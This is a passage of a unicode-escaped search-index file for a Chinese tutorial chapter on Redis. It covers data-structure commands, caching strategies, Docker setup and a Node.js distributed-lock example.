\u7684\u5217\u8868\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u94fe\u8868\u6570\u636e\u7ed3\u6784\u3002\u4f60\u53ef\u4ee5\u5728\u5217\u8868\u7684\u4e24\u7aef\u8fdb\u884c\u63d2\u5165\u3001\u5220\u9664\u7b49\u64cd\u4f5c\uff0c\u975e\u5e38\u9002\u5408\u5b9e\u73b0\u6d88\u606f\u961f\u5217\u3002 LPUSH\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u63d2\u5165\u5230\u5217\u8868\u7684\u5de6\u8fb9\u3002 RPUSH\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u63d2\u5165\u5230\u5217\u8868\u7684\u53f3\u8fb9\u3002 LPOP\uff1a\u4ece\u5217\u8868\u7684\u5de6\u8fb9\u5f39\u51fa\u4e00\u4e2a\u5143\u7d20\u3002 RPOP\uff1a\u4ece\u5217\u8868\u7684\u53f3\u8fb9\u5f39\u51fa\u4e00\u4e2a\u5143\u7d20\u3002 LRANGE\uff1a\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u4e2a\u8303\u56f4\u3002 RPUSH mylist \"apple\" \"banana\" \"cherry\" LPOP mylist LRANGE mylist 0 -1 \u8d1f\u7d22\u5f15\u548c python \u4e2d\u8d1f\u7d22\u5f15\u884c\u4e3a\u4e00\u81f4\u3002 \u96c6\u5408\uff08Set\uff09 Redis \u96c6\u5408\u662f\u4e00\u4e2a\u65e0\u5e8f\u7684\u5b57\u7b26\u4e32\u96c6\u5408\uff0c\u96c6\u5408\u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u552f\u4e00\u7684\u3002\u96c6\u5408\u652f\u6301\u5e38\u89c1\u7684\u96c6\u5408\u64cd\u4f5c\uff0c\u5982\u5e76\u96c6\u3001\u4ea4\u96c6\u548c\u5dee\u96c6\u7b49\u3002 SADD\uff1a\u5411\u96c6\u5408\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u3002 SMEMBERS\uff1a\u8fd4\u56de\u96c6\u5408\u4e2d\u7684\u6240\u6709\u6210\u5458\u3002 SISMEMBER\uff1a\u68c0\u67e5\u5143\u7d20\u662f\u5426\u662f\u96c6\u5408\u7684\u6210\u5458\u3002 SPOP\uff1a\u968f\u673a\u5f39\u51fa\u96c6\u5408\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u3002 SADD fruits \"apple\" \"banana\" \"cherry\" SMEMBERS fruits SISMEMBER fruits \"banana\" SPOP fruits \u6709\u5e8f\u96c6\u5408\uff08ZSet\uff09 \u6709\u5e8f\u96c6\u5408\u662f\u4e00\u4e2a\u5305\u542b\u552f\u4e00\u5143\u7d20\u7684\u96c6\u5408\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u6709\u4e00\u4e2a\u5206\u6570\uff08score\uff09\u3002\u6839\u636e\u5206\u6570\u7684\u5927\u5c0f\u6765\u4e3a\u5143\u7d20\u6392\u5e8f\u3002\u5b83\u9002\u7528\u4e8e\u6392\u884c\u699c\u3001\u6d88\u606f\u961f\u5217\u7b49\u573a\u666f\u3002 ZADD\uff1a\u5411\u6709\u5e8f\u96c6\u5408\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u3002 ZRANGE\uff1a\u8fd4\u56de\u6709\u5e8f\u96c6\u5408\u6307\u5b9a\u533a\u95f4\u7684\u6210\u5458\u3002 ZREM\uff1a\u4ece\u6709\u5e8f\u96c6\u5408\u4e2d\u79fb\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u6210\u5458\u3002 ZINCRBY\uff1a\u589e\u52a0\u6709\u5e8f\u96c6\u5408\u6210\u5458\u7684\u5206\u6570\u3002 ZADD leaderboard 100 \"Alice\" 150 \"Bob\" ZRANGE leaderboard 0 -1 # \u83b7\u53d6\u6240\u6709\u6210\u5458 ZINCRBY leaderboard 10 \"Alice\" # \u66f4\u65b0\u5206\u6570 ZREM leaderboard \"Bob\" # \u79fb\u9664\u67d0\u4e2a\u6210\u5458 Redis \u4f5c\u4e3a\u7f13\u5b58 \u524d\u9762\u6211\u4eec\u8bb2\u547d\u4ee4\u65f6\uff0c\u6ca1\u6709\u8bb2\u547d\u4ee4\u7684\u8fd4\u56de\u503c\uff0c\u56e0\u4e3a\u8fd9\u662f\u8bed\u8a00\u6709\u5173\u7684\u3002\u800c\u5bf9\u4e8e\u547d\u4ee4\u884c\u91cc\uff0c\u8fd4\u56de\u503c\u662f\u76f4\u63a5\u5c55\u793a\u51fa\u6765\u7684\u3002 Redis \u4f5c\u4e3a\u7f13\u5b58\u7684\u601d\u60f3\u5f88\u7b80\u5355\uff0c\u5373\u5728\u4ece\u6570\u636e\u5e93\u53d6\u503c\u524d\u5148\u4ece Redis \u53d6 (cache aside)\u3002\u8fd9\u91cc\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\u6709\uff0c\u7f13\u5b58\u6dd8\u6c70\uff0c\u5199\u4e00\u81f4\u6027\uff0c\u96ea\u5d29\u98ce\u9669\uff0c\u7f13\u5b58\u7a7f\u900f\u3002\u7f13\u5b58\u5c42\u901a\u5e38\u90e8\u7f72\u5728\u5e94\u7528\u548c\u6570\u636e\u5e93\u4e4b\u95f4\uff0c\u51cf\u5c11\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u538b\u529b\uff0c\u63d0\u9ad8\u54cd\u5e94\u901f\u5ea6\u3002 \u7f13\u5b58\u6dd8\u6c70\u7b56\u7565 Redis \u4f1a\u5728\u81ea\u5df1\u9700\u8981\u7684\u5185\u5b58\u8d85\u8fc7\u8bbe\u7f6e\u7684\u5bb9\u91cf\u4e0a\u7ebf\u540e\u81ea\u52a8\u6dd8\u6c70\u6570\u636e\uff0c\u53ef\u4ee5\u9009\u62e9\u4ee5\u4e0b\u7b56\u7565\uff0c LRU\uff08Least Recently Used\uff09\uff1a\u5220\u9664\u6700\u4e45\u672a\u88ab\u8bbf\u95ee\u7684\u952e\u3002 LFU\uff08Least Frequently Used\uff09\uff1a\u5220\u9664\u4f7f\u7528\u9891\u7387\u6700\u4f4e\u7684\u952e\u3002 TTL\uff08Time to Live\uff09\uff1a\u8bbe\u7f6e\u6bcf\u4e2a\u7f13\u5b58\u9879\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u8d85\u65f6\u81ea\u52a8\u5220\u9664\u3002 \u968f\u673a\u6dd8\u6c70\uff1a\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u952e\u5220\u9664\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5207\u6362\uff0c maxmemory-policy volatile-lru \u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u624b\u52a8\u8bbe\u5b9a\u8fc7\u671f\u65f6\u95f4\uff0c\u4f7f\u7528 EXPIRE \u547d\u4ee4\u6765\u4e3a\u5df2\u6709\u7684\u952e\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0c\u5355\u4f4d\u662f\u79d2\u3002 EXPIRE mykey 3600 # \u8bbe\u7f6e mykey \u952e\u5728 3600 \u79d2\uff081\u5c0f\u65f6\uff09\u540e\u8fc7\u671f \u5982\u679c\u4f60\u5728\u8bbe\u7f6e\u952e\u65f6\u540c\u65f6\u6307\u5b9a\u8fc7\u671f\u65f6\u95f4\uff0c\u53ef\u4ee5\u4f7f\u7528 SET \u547d\u4ee4\u7684 EX\uff08\u8fc7\u671f\u65f6\u95f4\uff0c\u5355\u4f4d\uff1a\u79d2\uff09\u6216 PX\uff08\u8fc7\u671f\u65f6\u95f4\uff0c\u5355\u4f4d\uff1a\u6beb\u79d2\uff09\u9009\u9879\uff1a SET mykey \"value\" EX 3600 # \u8bbe\u7f6e mykey \u952e\u5728 3600 \u79d2\u540e\u8fc7\u671f SET mykey \"value\" PX 1800000 # \u8bbe\u7f6e mykey \u952e\u5728 30 \u5206\u949f\u540e\u8fc7\u671f \u4f7f\u7528 TTL \u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u6307\u5b9a\u952e\u7684\u5269\u4f59\u751f\u5b58\u65f6\u95f4\u3002\u5982\u679c\u952e\u5df2\u8fc7\u671f\uff0cTTL \u4f1a\u8fd4\u56de -2\uff1b\u5982\u679c\u952e\u6ca1\u6709\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0cTTL \u4f1a\u8fd4\u56de -1\u3002 TTL mykey # \u8fd4\u56de mykey \u7684\u5269\u4f59\u751f\u5b58\u65f6\u95f4 \u5982\u679c\u4f60\u60f3\u53d6\u6d88\u5df2\u8bbe\u7f6e\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u8ba9\u952e\u53d8\u6210\u6c38\u4e45\u5b58\u5728\uff0c\u53ef\u4ee5\u4f7f\u7528 PERSIST \u547d\u4ee4\uff1a PERSIST mykey # \u53d6\u6d88 mykey \u7684\u8fc7\u671f\u65f6\u95f4 \u7f13\u5b58\u4e00\u81f4\u6027\u95ee\u9898 \u53ea\u8bfb\u573a\u666f\u7b56\u7565\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u6d89\u53ca\u5230\u5199\u65f6\uff0c\u6211\u4eec\u7684\u7f13\u5b58\u7b56\u7565\u9700\u8981\u66f4\u590d\u6742\u4e00\u4e9b\uff0c\u5e38\u7528\u7684\u6280\u672f\u6709\u4ee5\u4e0b\u51e0\u79cd\uff0c Cache Aside\uff08\u65c1\u8def\u7f13\u5b58\uff09 \u8fd9\u79cd\u6a21\u5f0f\u901a\u5e38\u5e94\u7528\u4e8e\u6570\u636e\u5e93\u67e5\u8be2\u7684\u573a\u666f\u3002\u5e94\u7528\u5728\u67e5\u8be2\u65f6\u5148\u5c1d\u8bd5\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u6570\u636e\uff0c\u5982\u679c\u7f13\u5b58\u4e2d\u6ca1\u6709\u518d\u4ece\u6570\u636e\u5e93\u4e2d\u83b7\u53d6\uff0c\u5e76\u5c06\u6570\u636e\u5e93\u67e5\u8be2\u7ed3\u679c\u653e\u5165\u7f13\u5b58\u3002\u5f53\u7f13\u5b58\u4e2d\u7684\u6570\u636e\u8fc7\u671f\u6216\u88ab\u6e05\u9664\u65f6\uff0c\u4e0b\u4e00\u6b21\u67e5\u8be2\u4f1a\u91cd\u65b0\u4ece\u6570\u636e\u5e93\u83b7\u53d6\u5e76\u66f4\u65b0\u7f13\u5b58\u3002 Read Through\uff08\u8bfb\u7a7f\u900f\uff09 \u5728\u8fd9\u4e2a\u6a21\u5f0f\u4e2d\uff0c\u5e94\u7528\u4e0d\u9700\u8981\u663e\u5f0f\u67e5\u8be2\u6570\u636e\u5e93\u3002\u5982\u679c\u7f13\u5b58\u4e2d\u6ca1\u6709\u6570\u636e\uff0c\u7f13\u5b58\u4f1a\u81ea\u52a8\u4ece\u6570\u636e\u5e93\u52a0\u8f7d\u6570\u636e\u5e76\u7f13\u5b58\u8d77\u6765\u3002\u7f13\u5b58\u8d1f\u8d23\u4ece\u6570\u636e\u5e93\u52a0\u8f7d\u6570\u636e\uff0c\u7c7b\u4f3c\u4e8e\u7f13\u5b58\u548c\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u4ee3\u7406\u3002 Write Through\uff08\u5199\u7a7f\u900f\uff09 \u5199\u5165\u6570\u636e\u65f6\uff0c\u9996\u5148\u4f1a\u5199\u5165\u7f13\u5b58\uff0c\u7136\u540e\u518d\u5199\u5165\u6570\u636e\u5e93\uff0c\u786e\u4fdd\u7f13\u5b58\u548c\u6570\u636e\u5e93\u7684\u6570\u636e\u4e00\u81f4\u3002\u8fd9\u79cd\u6a21\u5f0f\u9002\u7528\u4e8e\u6570\u636e\u66f4\u65b0\u9891\u7e41\u4e14\u9700\u8981\u4fdd\u6301\u7f13\u5b58\u548c\u6570\u636e\u5e93\u4e00\u81f4\u6027\u7684\u573a\u666f\u3002 Write Behind\uff08\u5199\u540e\u8bfb\uff09 \u6570\u636e\u9996\u5148\u5199\u5165\u7f13\u5b58\uff0c\u7136\u540e\u7531\u4e00\u4e2a\u5f02\u6b65\u7684\u8fc7\u7a0b\u66f4\u65b0\u6570\u636e\u5e93\u3002\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u6570\u636e\u5e93\u7684\u5199\u5165\u538b\u529b\uff0c\u9002\u7528\u4e8e\u4e00\u4e9b\u5bf9\u6570\u636e\u4e00\u81f4\u6027\u8981\u6c42\u4e0d\u9ad8\u7684\u573a\u666f\u3002 \u96ea\u5d29\u98ce\u9669 \u7f13\u5b58\u96ea\u5d29\u662f\u6307\u7f13\u5b58\u4e2d\u7684\u5927\u91cf\u6570\u636e\u5931\u6548\uff0c\u5bfc\u81f4\u5927\u91cf\u8bf7\u6c42\u76f4\u63a5\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u7ed9\u6570\u636e\u5e93\u5e26\u6765\u5de8\u5927\u538b\u529b\uff0c\u4ece\u800c\u5bfc\u81f4\u6570\u636e\u5e93\u5b95\u673a\u3002\u4e3a\u4e86\u907f\u514d\u7f13\u5b58\u96ea\u5d29\uff0c\u53ef\u4ee5\u91c7\u53d6\u4ee5\u4e0b\u7b56\u7565\uff1a \u5408\u7406\u8bbe\u7f6e\u7f13\u5b58\u8fc7\u671f\u65f6\u95f4\uff1a\u4e0d\u540c\u7684\u6570\u636e\u8bbe\u7f6e\u4e0d\u540c\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u907f\u514d\u540c\u4e00\u65f6\u95f4\u70b9\u5927\u91cf\u7f13\u5b58\u5931\u6548\u3002 \u7f13\u5b58\u9884\u70ed\uff1a\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\uff0c\u53ef\u4ee5\u9884\u5148\u52a0\u8f7d\u4e00\u4e9b\u5e38\u7528\u7684\u6570\u636e\u5230\u7f13\u5b58\u4e2d\uff0c\u907f\u514d\u9996\u6b21\u8bf7\u6c42\u65f6\u5927\u91cf\u67e5\u8be2\u6570\u636e\u5e93\u3002 \u4f7f\u7528\u591a\u7ea7\u7f13\u5b58\uff1a\u5728 Redis \u4e4b\u5916\u4f7f\u7528\u5176\u4ed6\u7f13\u5b58\u673a\u5236\uff08\u5982\u672c\u5730\u7f13\u5b58\uff09\uff0c\u907f\u514d\u5b8c\u5168\u4f9d\u8d56 Redis\u3002 \u4f7f\u7528\u4e92\u65a5\u9501\uff1a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u5206\u5e03\u5f0f\u9501\u673a\u5236\uff0c\u786e\u4fdd\u5728\u7f13\u5b58\u5931\u6548\u65f6\u53ea\u4f1a\u6709\u4e00\u4e2a\u8bf7\u6c42\u53bb\u52a0\u8f7d\u6570\u636e\uff0c\u9632\u6b62\u540c\u4e00\u4e2a\u6570\u636e\u88ab\u591a\u6b21\u52a0\u8f7d\u3002 \u7f13\u5b58\u7a7f\u900f \u7f13\u5b58\u7a7f\u900f\u6307\u7684\u662f\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u6570\u636e\u65e2\u4e0d\u5728\u7f13\u5b58\u4e2d\uff0c\u4e5f\u4e0d\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u5bfc\u81f4\u6bcf\u6b21\u8bf7\u6c42\u90fd\u76f4\u63a5\u67e5\u8be2\u6570\u636e\u5e93\u3002\u4e3a\u4e86\u907f\u514d\u7f13\u5b58\u7a7f\u900f\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\uff1a \u7f13\u5b58\u7a7a\u503c\uff1a\u5f53\u67d0\u4e2a\u6570\u636e\u67e5\u8be2\u8fd4\u56de\u4e3a\u7a7a\u65f6\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u7a7a\u503c\u7f13\u5b58\u4e00\u6bb5\u65f6\u95f4\uff0c\u907f\u514d\u91cd\u590d\u67e5\u8be2\u6570\u636e\u5e93\u3002 \u53c2\u6570\u6821\u9a8c\uff1a\u5728\u67e5\u8be2\u6570\u636e\u4e4b\u524d\uff0c\u5148\u8fdb\u884c\u53c2\u6570\u6821\u9a8c\uff0c\u907f\u514d\u65e0\u6548\u8bf7\u6c42\u89e6\u53d1\u6570\u636e\u5e93\u67e5\u8be2\u3002 Bloom Filter\uff1a\u4f7f\u7528\u5e03\u9686\u8fc7\u6ee4\u5668\u5728\u7f13\u5b58\u4e2d\u9884\u5148\u5224\u65ad\u8bf7\u6c42\u7684\u6570\u636e\u662f\u5426\u5b58\u5728\uff0c\u9632\u6b62\u65e0\u6548\u6570\u636e\u8bbf\u95ee\u6570\u636e\u5e93(\u5e03\u9686\u8fc7\u6ee4\u5668\u662f\u4e00\u79cd\u7a7a\u95f4\u6548\u7387\u9ad8\u7684\u6982\u7387\u578b\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u6d4b\u8bd5\u67d0\u4e2a\u5143\u7d20\u662f\u5426\u5728\u4e00\u4e2a\u96c6\u5408\u4e2d\u3002\u5b83\u7684\u7279\u70b9\u662f\u67e5\u8be2\u64cd\u4f5c\u975e\u5e38\u5feb\u901f\uff0c\u800c\u4e14\u5185\u5b58\u6d88\u8017\u6781\u4f4e\uff0c\u4f46\u5b83\u53ef\u80fd\u4f1a\u4ea7\u751f\u5047\u9633\u6027\uff0c\u5373\u9519\u8bef\u5730\u8ba4\u4e3a\u67d0\u4e2a\u5143\u7d20\u5b58\u5728\uff0c\u4f46\u7edd\u5bf9\u4e0d\u4f1a\u8bef\u5224\u67d0\u4e2a\u5143\u7d20\u4e0d\u5b58\u5728)\u3002 Redis \u4f5c\u4e3a\u5206\u5e03\u5f0f\u9501 Redis \u4f5c\u4e3a\u5206\u5e03\u5f0f\u9501\u65f6\uff0c\u53ef\u4ee5\u5229\u7528 Redis \u7684 SET \u547d\u4ee4\u7ed3\u5408\u8fc7\u671f\u65f6\u95f4\u6765\u5b9e\u73b0\u3002\u901a\u8fc7\u8bbe\u7f6e\u4e00\u4e2a\u552f\u4e00\u7684\u9501\u6807\u8bc6\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u968f\u673a\u503c\uff09\uff0c\u5e76\u8bbe\u7f6e\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff08\u9632\u6b62\u6b7b\u9501\uff09\uff0c\u6765\u786e\u4fdd\u5728\u540c\u4e00\u65f6\u95f4\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u80fd\u83b7\u5f97\u9501\u3002 \u6211\u4eec\u9700\u8981\u8fd9\u4e9b\u547d\u4ee4\u3002 SETNX\uff1a\u8fd9\u662f Redis \u4e2d\u7684\u4e00\u79cd\u547d\u4ee4\uff0c\u5b83\u53ea\u6709\u5728\u952e\u4e0d\u5b58\u5728\u65f6\u624d\u4f1a\u8bbe\u7f6e\u503c\u3002\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0\u9501\u7684\u83b7\u53d6\u3002 EXPIRE\uff1a\u8bbe\u7f6e\u4e00\u4e2a\u8fc7\u671f\u65f6\u95f4\uff0c\u9632\u6b62\u9501\u56e0\u4e3a\u8fdb\u7a0b\u5d29\u6e83\u7b49\u95ee\u9898\u5bfc\u81f4\u6b7b\u9501\u3002 GET\uff1a\u68c0\u67e5\u5f53\u524d\u9501\u662f\u5426\u5b58\u5728\u3002 \u5047\u8bbe\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u7b80\u5355\u7684\u5206\u5e03\u5f0f\u9501\uff0c\u4ee5\u4e0b\u662f\u4f7f\u7528 Node.js \u548c ioredis \u5e93\u5b9e\u73b0\u7684\u5206\u5e03\u5f0f\u9501\u793a\u4f8b\uff1a const Redis = require('ioredis'); const redis = new Redis({ host: 'localhost', // Redis\u670d\u52a1\u5668\u5730\u5740 port: 6379, // Redis\u7aef\u53e3 }); // \u9501\u7684 key \u548c\u8fc7\u671f\u65f6\u95f4 const LOCK_KEY = 'myLock'; const LOCK_TIMEOUT = 10; // 10\u79d2\u8fc7\u671f\u65f6\u95f4 // \u83b7\u53d6\u5206\u5e03\u5f0f\u9501 async function acquireLock() { const lockValue = Math.random().toString(36).substr(2); // \u751f\u6210\u552f\u4e00\u7684\u9501\u6807\u8bc6 const result = await redis.set(LOCK_KEY, lockValue, 'NX', 'EX', LOCK_TIMEOUT); if (result === 'OK') { console.log('Lock acquired successfully'); return lockValue; } else { console.log('Failed to acquire lock'); await new Promise(resolve => setTimeout(resolve, 500)); return acquireLock(); } } // \u91ca\u653e\u5206\u5e03\u5f0f\u9501 async function releaseLock(lockValue) { const currentValue = await redis.get(LOCK_KEY); // \u53ea\u6709\u5f53\u5f53\u524d\u9501\u7684\u503c\u4e0e\u4f20\u5165\u7684 lockValue \u4e00\u81f4\u65f6\u624d\u80fd\u91ca\u653e if (currentValue === lockValue) { await redis.del(LOCK_KEY); console.log('Lock released successfully'); } else { console.log('Failed to release lock: Lock value mismatch'); } } // \u6a21\u62df\u4efb\u52a1\u6267\u884c async function performTask() { const lockValue = await acquireLock(); if (lockValue) { try { // \u6267\u884c\u4efb\u52a1 console.log('Task is being executed...'); await new Promise(resolve => setTimeout(resolve, 1000)); // \u6a21\u62df\u4efb\u52a1\u6267\u884c\u65f6\u95f4 } finally { await releaseLock(lockValue); } } else { console.log('Cannot perform task, lock acquisition failed'); } } // \u6267\u884c\u4efb\u52a1 for(let i = 0; i < 10; i++) { performTask(); } Redis \u4f1a\u786e\u4fdd\u53ea\u6709\u4e00\u4e2a\u4efb\u52a1\u80fd\u6210\u529f\u83b7\u5f97\u9501\u5e76\u6267\u884c\uff0c\u5176\u4ed6\u4efb\u52a1\u4f1a\u5c1d\u8bd5\u91cd\u65b0\u83b7\u53d6\u9501\uff0c\u76f4\u5230\u9501\u88ab\u91ca\u653e\u3002 \u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u786e\u4fdd\u5728\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u67d0\u4e2a\u5173\u952e\u4efb\u52a1\uff0c\u9002\u7528\u4e8e\u9650\u6d41\u3001\u4efb\u52a1\u8c03\u5ea6\u7b49\u573a\u666f\u3002","title":"Redis"},{"location":"28/#ch28-redis","text":"Redis \u5373 Remote Dictionary Service\uff0c\u8fdc\u7a0b\u5b57\u5178\u670d\u52a1\u3002\u5b83\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u952e\u503c\uff08Key-Value\uff09\u5b58\u50a8\u6570\u636e\u5e93\uff0c\u5e7f\u6cdb\u5e94\u7528\u4e8e\u7f13\u5b58\u3001\u6d88\u606f\u961f\u5217\u3001\u5b9e\u65f6\u7edf\u8ba1\u7b49\u573a\u666f\u3002\u4e0e\u4f20\u7edf\u7684\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e0d\u540c\uff0cRedis \u5728\u5185\u5b58\u4e2d\u8fdb\u884c\u6570\u636e\u5b58\u50a8\uff0c\u63d0\u4f9b\u4e86\u6781\u9ad8\u7684\u8bfb\u5199\u6027\u80fd\uff0c\u540c\u65f6\u4e5f\u652f\u6301\u591a\u79cd\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\u548c\u64cd\u4f5c\u3002 \u5c3d\u7ba1 Redis \u8fd1\u671f\u4fee\u6539\u4e86\u5f00\u6e90\u534f\u8bae\uff0c\u4f46\u4e0d\u53ef\u5426\u8ba4\u5b83\u5df2\u7ecf\u662f\u540c\u7c7b\u4e2d\u95f4\u4ef6\u7684\u6807\u51c6\u3002\u5982\u679c\u5bf9\u5f00\u6e90\u6709\u5f3a\u9700\u6c42\uff0c\u53ef\u4ee5\u8003\u8651\u76f8\u4e92\u517c\u5bb9\u7684\u5176\u5b83\u4e2d\u95f4\u4ef6\uff0c\u5982 KeyDB\u3002 \u6211\u4eec\u9700\u8981\u7528 SQL \u64cd\u7eb5\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u540c\u6837\u7684\uff0cRedis \u4e5f\u6709\u4e13\u95e8\u7684\u547d\u4ee4\u6765\u64cd\u7eb5\u3002\u5f53\u7136\uff0c\u4e5f\u6709 ORM \u8fdb\u884c\u8fdb\u4e00\u6b65\u5305\u88c5\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u4ecb\u7ecd Redis \u7684\u5e38\u7528\u6570\u636e\u7ed3\u6784\u4e0e\u547d\u4ee4\uff0c\u4f5c\u4e3a\u7f13\u5b58\u548c\u5206\u5e03\u5f0f\u9501\u7684\u7528\u6cd5\u3002 Redis \u53ef\u4ee5\u76f4\u63a5\u90e8\u7f72\u4e3a\u96c6\u7fa4\uff0c\u96c6\u7fa4\u7684\u64cd\u4f5c\u4e0e\u5355\u4f53\u4e00\u81f4\u3002","title":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch28 Redis"},{"location":"28/#redis","text":"version: '3.8' services: redis: image: redis:latest container_name: redis_container ports: - \"6379:6379\" volumes: - ./data:/data \u542f\u52a8\u540e\uff0c\u4f7f\u7528 redis-cli \u8fde\u63a5\u5230 Redis \u5bb9\u5668\uff1a docker exec -it redis_container redis-cli \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u6253\u5f00\u4e00\u4e2a redis-cli \u4f1a\u8bdd\uff0c\u4f60\u53ef\u4ee5\u5728\u5176\u4e2d\u6267\u884c Redis \u547d\u4ee4\u3002\u5982\u679c\u4f60\u53ea\u662f\u9700\u8981\u7b80\u5355\u7684\u6d4b\u8bd5\uff0c\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u786e\u4fdd Redis \u6b63\u5e38\u5de5\u4f5c\uff1a SET key \"Hello Redis\" GET key \u8fd9\u4f1a\u5c06\u952e key \u8bbe\u7f6e\u4e3a \"Hello Redis\"\uff0c\u7136\u540e\u901a\u8fc7 GET \u547d\u4ee4\u8fd4\u56de\u8be5\u952e\u7684\u503c\uff0c\u8f93\u51fa\u5e94\u8be5\u662f\uff1a \"Hello Redis\" \u8981\u9000\u51fa redis-cli\uff0c\u4f7f\u7528 exit","title":"\u542f\u52a8 Redis"},{"location":"28/#redis_1","text":"","title":"Redis \u5e38\u7528\u6570\u636e\u7ed3\u6784\u4e0e\u547d\u4ee4"},{"location":"28/#string","text":"Redis \u4e2d\u6700\u57fa\u672c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5b83\u53ef\u4ee5\u5b58\u50a8\u4efb\u4f55\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4f8b\u5982\u6574\u6570\u3001\u6d6e\u70b9\u6570\u3001\u4e8c\u8fdb\u5236\u6570\u636e\u7b49\u3002\u6ce8\u610f\uff0cRedis \u4e2d\u6ca1\u6709\u6570\u503c\u7c7b\u578b\uff0c\u6240\u6709\u6570\u503c\u90fd\u6309\u5b57\u7b26\u4e32\u5b58\u50a8\u3002 SET\uff1a\u8bbe\u7f6e\u952e\u7684\u503c\u3002 GET\uff1a\u83b7\u53d6\u952e\u7684\u503c\u3002 DEL\uff1a\u5220\u9664\u4e00\u4e2a\u6216\u591a\u4e2a\u952e\u3002 INCR/DECR\uff1a\u81ea\u589e/\u81ea\u51cf\u4e00\u4e2a\u6574\u6570\u503c\u3002 SET username \"john_doe\" # \u8bbe\u7f6e\u952e\u503c GET username # \u83b7\u53d6\u952e\u503c INCR counter # \u589e\u52a0counter\u7684\u503c \u8fd8\u53ef\u4ee5\u6279\u91cf\u8bbe\u7f6e\uff0c MSET \u547d\u4ee4\u5141\u8bb8\u4e00\u6b21\u8bbe\u7f6e\u591a\u4e2a\u952e\u503c\u5bf9\u3002\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a MSET key1 value1 key2 value2 key3 value3 \u4f8b\u5982\uff0c\u6279\u91cf\u8bbe\u7f6e\u4e09\u4e2a\u952e\u503c\u5bf9\uff1a MSET username \"john_doe\" email \"john@example.com\" age 30 MGET \u547d\u4ee4\u5141\u8bb8\u4e00\u6b21\u83b7\u53d6\u591a\u4e2a\u952e\u7684\u503c\u3002\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a MGET key1 key2 key3 \u4f8b\u5982\uff0c\u6279\u91cf\u83b7\u53d6\u4e4b\u524d\u8bbe\u7f6e\u7684\u4e09\u4e2a\u952e\u503c\uff1a MGET username email age \u5982\u679c\u67d0\u4e2a\u952e\u4e0d\u5b58\u5728\uff0c\u8fd4\u56de nil\uff08\u7a7a\u503c\uff09\uff0c\u4f8b\u5982\uff1a MGET username email non_existing_key # \u8fd4\u56de (john_doe, john@example.com, nil) DEL \u4e5f\u652f\u6301\u5220\u9664\u591a\u4e2a\u952e\u3002\u5176\u8bed\u6cd5\u5982\u4e0b\uff1a DEL key1 key2 key3","title":"\u5b57\u7b26\u4e32\uff08String\uff09"},{"location":"28/#hash","text":"Redis \u7684\u54c8\u5e0c\u662f\u4e00\u4e2a\u952e\u503c\u5bf9\u96c6\u5408\uff0c\u5b83\u7279\u522b\u9002\u5408\u5b58\u50a8\u5bf9\u8c61\u7c7b\u578b\u7684\u6570\u636e\u3002\u6bcf\u4e2a\u54c8\u5e0c\u8868\u6709\u4e00\u4e2a\u952e\u548c\u591a\u4e2a\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u6709\u4e00\u4e2a\u503c\u3002 HSET\uff1a\u8bbe\u7f6e\u54c8\u5e0c\u8868\u5b57\u6bb5\u7684\u503c\u3002 HGET\uff1a\u83b7\u53d6\u54c8\u5e0c\u8868\u5b57\u6bb5\u7684\u503c\u3002 